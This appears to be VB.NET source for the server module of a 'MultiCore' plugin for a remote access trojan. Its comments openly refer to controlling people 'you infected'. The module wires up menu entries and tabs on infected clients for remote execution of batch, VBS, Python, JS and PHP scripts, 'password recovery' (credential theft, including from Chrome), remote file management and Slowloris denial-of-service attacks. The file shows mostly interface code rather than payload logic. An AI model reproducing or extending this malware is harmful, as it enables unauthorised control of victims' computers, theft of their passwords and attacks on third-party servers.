Option Strict Off
' Importing shit.
Imports Microsoft.VisualBasic
Imports System.Windows.Forms
Imports System.Net


'  _                    ____         __ _                          
' | |    __ _ _____   _/ ___|  ___  / _| |___      ____ _ _ __ ___ 
' | |   / _` |_  / | | \___ \ / _ \| |_| __\ \ /\ / / _` | '__/ _ \
' | |__| (_| |/ /| |_| |___) | (_) |  _| |_ \ V  V / (_| | | |  __/
' |_____\__,_/___|\__, |____/ \___/|_|  \__| \_/\_/ \__,_|_|  \___|
'                 |___/                      Copyright LazySoftware


Module ServerMain

#Region " Plugin Hosts "

    'Global naming of Aeons shit.
    Public NetworkHost As IServerNetworkHost
    Public UIHost As IServerUIHost
    Public Logging As IServerLoggingHost
    Public Clients2 As IClient()
    Public NetworkHosst As IClient()

#End Region

#Region " Public Data "

    Public RemTAB As New RemoteScript
    Public FileMan As New FileManager
    Public PluginInfo As New PluginInfo

    Public RecMul As New RecoveryMulti
    Public SSTMutli As New StressMulti

#End Region

#Region " Version "

    ' ----> ######## KEEP THIS VARIABLE UP TO DATE ######## <----

    Public UpdateVersion As Integer = 15

    ' ----> ############################################### <----

#End Region

#Region " Send Methods "

    'Send that shit to the poor bastard that you infected.
    Public Sub SendCommand(Client As IClient, ParamArray params As Object())
        NetworkHost.SendToClient(Client, Nothing, True, params)
    End Sub

#End Region

    Public Sub InitializePlugin()

        Dim ToolsBatch As New ContextEntry() With {.Name = "Execute Batch Script", .Icon = "script_go", .ClickedCallback = AddressOf ToolsBatchCallback}
        Dim ToolsHTML As New ContextEntry() With {.Name = "Execute HTML Script", .Icon = "script_go", .ClickedCallback = AddressOf ToolsHTMLCallback}
        Dim ToolsVBS As New ContextEntry() With {.Name = "Execute VBS Script", .Icon = "script_add", .ClickedCallback = AddressOf ToolsVBSCallback}
        Dim ToolsPy As New ContextEntry() With {.Name = "Execute Python Script", .Icon = "script_error", .ClickedCallback = AddressOf ToolsPyCallback}
        Dim ToolsJS As New ContextEntry() With {.Name = "Execute Java Script", .Icon = "script_error", .ClickedCallback = AddressOf ToolsJSCallback}
        Dim ToolsPHP As New ContextEntry() With {.Name = "Execute PHP Script", .Icon = "script_error", .ClickedCallback = AddressOf ToolsPHPCallback}
        Dim ToolsREM As New ContextEntry() With {.Name = "Remove all script files", .Icon = "script_delete", .ClickedCallback = AddressOf ToolsREMCallback}
        Dim Tools As New ContextEntry With {.Name = "Remote Scripting", .Icon = "script_code", .Children = {ToolsBatch, ToolsHTML, ToolsVBS, ToolsPy, ToolsJS, ToolsPHP, ToolsREM}}

        Dim Rec As New ContextEntry With {.Name = "Recover Passwords", .Icon = "key_go", .ClickedCallback = AddressOf ToolsRecCallback}
        Dim Man As New ContextEntry With {.Name = "Manage Files", .Icon = "folder_go", .ClickedCallback = AddressOf ManaCallback}

        Dim SST As New ContextEntry With {.Name = "Slowloris", .Icon = "transmit", .ClickedCallback = AddressOf StressCallback}
        Dim SSTBase As New ContextEntry With {.Name = "Stress Testing", .Icon = "transmit_blue", .Children = {SST}}

        Dim Donate As New ContextEntry With {.Name = "Donate", .Icon = "Bitcoin", .ClickedCallback = AddressOf Donation}

        Dim MultiCoreContext As New ContextEntry With {.Name = "MultiCore", .Icon = "Multi", .Children = {Tools, Rec, Man, SSTBase, Donate}}

        Dim mulRecoverTAB As New TabEntry With {.Name = "Password Recovery", .UserControl = RecMul, .CategoryName = "MultiCore", .Icon = "wrench"}
        Dim mulStressTAB As New TabEntry With {.Name = "Stress Testing", .UserControl = SSTMutli, .CategoryName = "MultiCore", .Icon = "wrench"}
        Dim mulScriptTAB As New TabEntry With {.Name = "Remote Scripting", .UserControl = RemTAB, .CategoryName = "MultiCore", .Icon = "wrench"}
        Dim mulPInfoTAB As New TabEntry With {.Name = "Information", .UserControl = PluginInfo, .CategoryName = "MultiCore", .Icon = "wrench"}

        Dim ChromeCol As New ColumnEntry With {.Name = "Chrome", .Width = 80, .AllowGrouping = True}

        UIHost.AddContextEntry(MultiCoreContext)

        UIHost.AddTabEntry(mulRecoverTAB)
        UIHost.AddTabEntry(mulStressTAB)
        UIHost.AddTabEntry(mulScriptTAB)
        UIHost.AddTabEntry(mulPInfoTAB)

        UIHost.AddClientColumnEntry(ChromeCol)

    End Sub

End Module
